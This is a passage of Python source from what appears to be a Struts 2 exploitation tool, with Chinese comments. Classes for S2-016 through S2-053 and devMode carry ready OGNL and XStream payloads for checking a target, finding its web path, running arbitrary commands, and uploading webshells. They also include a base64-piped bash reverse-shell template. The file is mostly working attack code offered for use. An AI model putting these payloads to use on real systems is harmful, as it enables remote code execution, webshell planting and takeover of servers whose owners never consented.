        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        poc = self.check_poc.format(num1=num1, num2=num2)
        html = get(self.url + '?' + poc, self.headers, self.encoding)
        nn = str(num1 + num2)
        if html.startswith("ERROR:"):
            return html
        elif nn in html:
            self.is_vul = True
            self.select_exec()
            return 'S2-016'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        html = get(self.url + "?" + self.web_path, self.headers, self.encoding)
        return html

    def echo_check(self, exec_fun):
        """通过echo输出检查漏洞是否存在"""
        hash_str = get_hash()
        html = exec_fun("echo " + hash_str)
        if hash_str in html:
            return True
        else:
            return False

    def select_exec(self):
        """选择合适的执行命令的exp"""
        result = self.echo_check(self.exec_cmd1)
        if result:
            self.exec_payload = "payload1"
        else:
            result = self.echo_check(self.exec_cmd2)
            if result:
                self.exec_payload = "payload2"
            else:
                result = self.echo_check(self.exec_cmd3)
                if result:
                    self.exec_payload = "payload3"
                else:
                    self.exec_payload = "None"

    def exec_cmd(self, cmd):
        if self.exec_payload not in self.exec_dict:
            # print("[+] 本程序S2_016预设EXP对 {url} 无效!".format(url=self.url))
            return None
        result = self.exec_dict.get(self.exec_payload)(cmd)
        return result

    def exec_cmd1(self, cmd):
        """执行命令"""
        cmd = parse_cmd(cmd)
        html = get(self.url + "?" + self.exec_payload1.format(cmd=quote(cmd)), self.headers,
                   self.encoding)
        return html

    def exec_cmd2(self, cmd):
        """执行命令"""
        html = get(self.url + "?" + self.exec_payload2.format(cmd=quote(cmd)), self.headers,
                   self.encoding)
        return html

    def exec_cmd3(self, cmd):
        """执行命令"""
        html = get(self.url + "?" + self.exec_payload3.replace('CMD', quote(cmd)).replace('ENCODING', self.encoding),
                   self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html

    def upload_shell1(self, upload_path, shell_path):
        shell = read_file(shell_path, self.encoding)
        data = self.upload_payload1.replace('PATH', quote(upload_path)).replace('SHELL', quote(shell))
        html = post(self.url, data, self.headers, self.encoding)
        if html == 'OK':
            return True
        else:
            return False

    def upload_shell2(self, upload_path, shell_path):
        shell = read_file(shell_path, self.encoding)
        data = "t=" + quote(shell)
        web_path = self.get_path()
        upload_path = upload_path.replace(web_path, '')
        html = post(self.url + '?' + self.upload_payload2.format(path=upload_path), data, self.headers, self.encoding)
        if html == 'OK':
            return True
        else:
            return False

    def upload_shell(self, upload_path, shell_path):
        result = self.upload_shell1(upload_path, shell_path)
        if not result:
            result = self.upload_shell2(upload_path, shell_path)
        return result


class S2_019:
    """S2-019漏洞检测利用类"""
    info = "[+] S2-019:影响版本Struts 2.0.0-2.3.15.1; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传"
    web_path = "%23req%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')%2C%23resp%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23resp.setCharacterEncoding('{encoding}')%2C%23resp.getWriter().println(%23req.getSession().getServletContext().getRealPath('%2F'))%2C%23resp.getWriter().flush()%2C%23resp.getWriter().close()"
    exec_payload = "%23f%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23resp%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B{cmd}%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B1000%5D%2C%23d.read(%23e)%2C%23resp.println(%23e)%2C%23resp.close()"
    upload_payload = r"""debug=command&expression=%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().print(%22O%22),%23res.getWriter().print(%22K%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22{path}%22)).append(%23req.getParameter(%22shell%22)).close()&shell={shell}"""
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        html = echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-019'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        html = get(self.url + "?debug=command&expression={payload}".format(
            payload=self.web_path.format(encoding=self.encoding)), self.headers, self.encoding)
        return html

    def exec_cmd(self, cmd):
        """执行命令"""
        cmd = parse_cmd(cmd)
        html = get(
            self.url + "?debug=command&expression={payload}".format(payload=self.exec_payload.format(cmd=quote(cmd))),
            self.headers,
            self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html

    def upload_shell(self, upload_path, shell_path):
        shell = read_file(shell_path, self.encoding)
        data = self.upload_payload.format(path=quote(upload_path), shell=quote(shell))
        html = post(self.url, data, self.headers, self.encoding)
        if html == 'OK':
            return True
        else:
            return False


class S2_029:
    """S2-029漏洞检测利用类"""
    info = "[+] S2-029:影响版本Struts 2.0.0-2.3.24.1(除了2.3.20.3); POST请求发送数据,需要参数; 默认参数:message; 支持任意命令执行和反弹shell"
    exec_payload = "(%23_memberAccess%5B'allowPrivateAccess'%5D%3Dtrue%2C%23_memberAccess%5B'allowProtectedAccess'%5D%3Dtrue%2C%23_memberAccess%5B'excludedPackageNamePatterns'%5D%3D%23_memberAccess%5B'acceptProperties'%5D%2C%23_memberAccess%5B'excludedClasses'%5D%3D%23_memberAccess%5B'acceptProperties'%5D%2C%23_memberAccess%5B'allowPackageProtectedAccess'%5D%3Dtrue%2C%23_memberAccess%5B'allowStaticMethodAccess'%5D%3Dtrue%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream()))"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        if not data:
            self.data = "message={exp}"
        else:
            self.data = data
        self.encoding = encoding
        self.is_vul = False
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        html = echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-029'
        return self.is_vul

    def exec_cmd(self, cmd):
        """执行命令"""
        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))
        html = post(self.url, data, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html


class S2_032:
    """S2-032漏洞检测利用类"""
    info = "[+] S2-032:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell"
    check_poc = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=10086"
    web_path = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding={encoding}"
    exec_payload = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding={encoding}&cmd={cmd}"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """选择可以利用成功的payload"""
        html = get(self.url + '?' + self.check_poc, self.headers, self.encoding)
        if html.startswith("ERROR:"):
            return html
        elif html == "1008660253718":
            self.is_vul = True
            return 'S2-032'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        html = get(self.url + '?' + self.web_path.format(encoding=self.encoding), self.headers, self.encoding)
        return html

    def exec_cmd(self, cmd):
        """执行命令"""
        payload = self.exec_payload.format(cmd=quote(cmd), encoding=self.encoding)
        html = get_stream(self.url + '?' + payload, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html


class S2_033:
    """S2-033漏洞检测利用类"""
    info = "[+] S2-033:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据; 支持任意命令执行和反弹shell"
    check_poc = "%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=10086"
    exec_payload = "%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command={cmd}"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        if url.endswith('/'):
            self.url = url
        else:
            self.url = url + '/'
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """选择可以利用成功的payload"""
        html = get(self.url + self.check_poc, self.headers, self.encoding)
        if html.startswith("ERROR:"):
            return html
        elif html == "1008660253718":
            self.is_vul = True
            return 'S2-033'
        return self.is_vul

    def exec_cmd(self, cmd):
        """执行命令"""
        payload = self.exec_payload.format(cmd=quote(cmd))
        html = get_stream(self.url + payload, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html


class S2_037:
    """S2-037漏洞检测利用类"""
    info = "[+] S2-037:影响版本Struts 2.3.20-2.3.28.1; GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell"
    web_path = "%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f"
    exec_payload = "(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command={cmd}"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        if url.endswith('/'):
            self.url = url
        else:
            self.url = url + '/'
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """选择可以利用成功的payload"""
        html = echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-037'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        html = get(self.url + self.web_path, self.headers, self.encoding)
        return html

    def exec_cmd(self, cmd):
        """执行命令"""
        payload = self.exec_payload.format(cmd=quote(cmd))
        html = get_stream(self.url + payload, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html


class S2_045:
    """S2-045漏洞检测利用类"""
    info = "[+] S2-045:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹shell和文件上传"
    web_path = r"""%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath("/"))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"""
    exec_payload = r"""%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='CMD').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"""
    upload_payload = r"""%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#fos= new java.io.FileOutputStream(#req.getParameter("f")),#fos.write(#req.getParameter("t").getBytes()),#fos.close()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println("OK"),(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())))}"""
    shell = "{echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.data = data
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        html = echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-045'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        self.headers['Content-Type'] = self.web_path
        html = post(self.url, self.data, self.headers, self.encoding)
        return html

    def exec_cmd(self, cmd):
        """执行命令"""
        self.headers['Content-Type'] = self.exec_payload.replace('CMD', cmd)
        html = post_stream(self.url, self.data, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html

    def upload_shell(self, upload_path, shell_path):
        shell = read_file(shell_path, self.encoding)
        data = "?t={shell}&f={path}".format(shell=quote(shell), path=upload_path)
        self.headers['Content-Type'] = self.upload_payload
        html = post(self.url + data, self.data, self.headers, self.encoding)
        if html == 'OK':
            return True
        else:
            return False


class S2_046:
    """S2-046漏洞检测利用类"""
    info = "[+] S2-046:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹shell和文件上传"
    web_path = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=ENCODING')).(#res.getWriter().print('')).(#res.getWriter().print('')).(#res.getWriter().print(#req.getSession().getServletContext().getRealPath('/'))).(#res.getWriter().flush()).(#res.getWriter().close())}\0b"
    check_poc = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=ENCODING')).(#res.getWriter().print('security_')).(#res.getWriter().print('check')).(#res.getWriter().flush()).(#res.getWriter().close())}\0b"
    exec_payload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=ENCODING')).(#s=new java.util.Scanner((new java.lang.ProcessBuilder('CMD'.toString().split('\\\\s'))).start().getInputStream()).useDelimiter('\\\\AAAA')).(#str=#s.hasNext()?#s.next():'').(#res.getWriter().print(#str)).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())}\0b"
    upload_paylaod = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=ENCODING')).(#filecontent='SHELL').(new java.io.BufferedWriter(new java.io.FileWriter('PATH')).append(new java.net.URLDecoder().decode(#filecontent,'ENCODING')).close()).(#res.getWriter().print('O')).(#res.getWriter().print('K')).(#res.getWriter().print(#req.getContextPath())).(#res.getWriter().flush()).(#res.getWriter().close())}\0b"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        files = {'test': (self.check_poc.replace('ENCODING', self.encoding), b'x', 'text/plain')}
        html = post(self.url, files=files, encoding=self.encoding)
        if html.startswith("ERROR:"):
            return html
        elif html == 'security_check':
            self.is_vul = True
            return 'S2-046'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        files = {'test': (self.web_path.replace('ENCODING', self.encoding), b'x', 'text/plain')}
        html = post(self.url, files=files, encoding=self.encoding)
        return html

    def exec_cmd(self, cmd):
        """执行命令"""
        paylaod = self.exec_payload.replace('CMD', cmd).replace('ENCODING', self.encoding)
        html = post_file(self.url, paylaod, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html

    def upload_shell(self, upload_path, shell_path):
        shell = read_file(shell_path, self.encoding)
        files = {'test': (
            self.upload_paylaod.replace('SHELL', quote(shell)).replace('PATH', upload_path).replace('ENCODING',
                                                                                                    self.encoding),
            b'x',
            'text/plain')}
        html = post(self.url, files=files, encoding=self.encoding)
        if html == 'OK':
            return True
        else:
            return False


class S2_048:
    """S2-048漏洞检测利用类"""
    info = "[+] S2-048:影响版本Struts 2.3.x with Struts 1 plugin and Struts 1 action; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell"
    check_poc = "%24%7B{num1}%2B{num2}%7D"
    exec_payload = "%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream())).(%23q)%7D"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        if not data:
            self.data = "username=test&password={exp}"
        else:
            self.data = data
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        poc = self.check_poc.format(num1=num1, num2=num2)
        data = self.data.format(exp=poc)
        html = post_stream(self.url, data, self.headers, self.encoding)
        nn = str(num1 + num2)
        if html.startswith("ERROR:"):
            return html
        elif nn in html:
            self.is_vul = True
            return 'S2-048'
        return self.is_vul

    def exec_cmd(self, cmd):
        """执行命令"""
        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))
        html = post(self.url, data, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html


class S2_052:
    """S2-052漏洞检测利用类"""
    info = "[+] S2-052:影响版本Struts 2.1.2-2.3.33,2.5-2.5.12; POST请求发送数据,不需要参数; 支持任意命令执行(无回显)和反弹shell,不支持检测该漏洞是否存在"
    exec_payload = """<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        {cmd}
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>"""
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/xml'

    def exec_cmd(self, cmd):
        """执行命令"""
        cmd = parse_cmd(cmd, type='xml')
        data = self.exec_payload.format(cmd=cmd)
        html = post(self.url, data, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html


class S2_053:
    """S2-053漏洞检测利用类"""
    info = "[+] S2-053:影响版本Struts 2.0.1-2.3.33,2.5-2.5.10; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell"
    check_poc = "%25%7B{num1}%2B{num2}%7D"
    exec_payload = "%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3D'{cmd}').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd.exe'%2C'%2Fc'%2C%23cmd%7D%3A%7B'%2Fbin%2Fbash'%2C'-c'%2C%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7D%0A"
    shell = "{echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        if not data:
            self.data = "username=test&password={exp}"
        else:
            self.data = data
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        poc = self.check_poc.format(num1=num1, num2=num2)
        data = self.data.format(exp=poc)
        html = post_stream(self.url, data, self.headers, self.encoding)
        nn = str(num1 + num2)
        if html.startswith("ERROR:"):
            return html
        elif nn in html:
            self.is_vul = True
            return 'S2-053'
        return self.is_vul

    def exec_cmd(self, cmd):
        """执行命令"""
        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))
        html = post(self.url, data, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html


class S2_devMode:
    """S2-devMode漏洞检测利用类"""
    info = "[+] S2-devMode:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell"
    web_path = "?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest"
